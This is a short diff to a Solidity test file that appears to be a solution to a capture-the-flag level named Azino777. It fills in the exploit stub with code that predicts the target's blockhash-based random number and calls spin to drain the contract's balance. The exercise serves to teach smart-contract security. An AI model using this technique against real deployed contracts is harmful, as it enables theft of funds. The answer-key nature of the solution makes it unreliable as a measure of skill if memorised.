@@ -15,11 +15,14 @@ contract Azino777Test is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint256 bigValue = 1157920792373163043235709850086876098532699846659765743394964840033335306843;
+        uint256 blockHash = uint256(blockhash(block.number - 1));
+        uint256 sum = uint256(blockHash / bigValue % 100);
+        instance.spin{value: 0.01 ether}(sum);
 
         checkSuccess();
     }
-
+    
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
     }
